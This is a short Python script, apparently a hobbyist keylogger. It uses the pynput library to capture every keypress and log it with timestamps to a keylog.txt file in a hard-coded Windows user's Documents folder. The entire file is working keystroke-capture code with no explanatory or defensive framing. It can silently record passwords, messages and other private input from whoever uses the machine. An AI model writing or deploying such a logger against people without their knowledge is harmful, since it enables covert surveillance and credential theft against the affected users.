from pynput.keyboard import Listener


import os
import logging


signed_user = os.getlogin()
logging_directory = f"C:/Users/singh/Documents"

logging.basicConfig(filename=f"{logging_directory}/keylog.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s:")

def key_handler(key):
    logging.info(key)

with Listener(on_press=key_handler) as listener:
    listener.join()



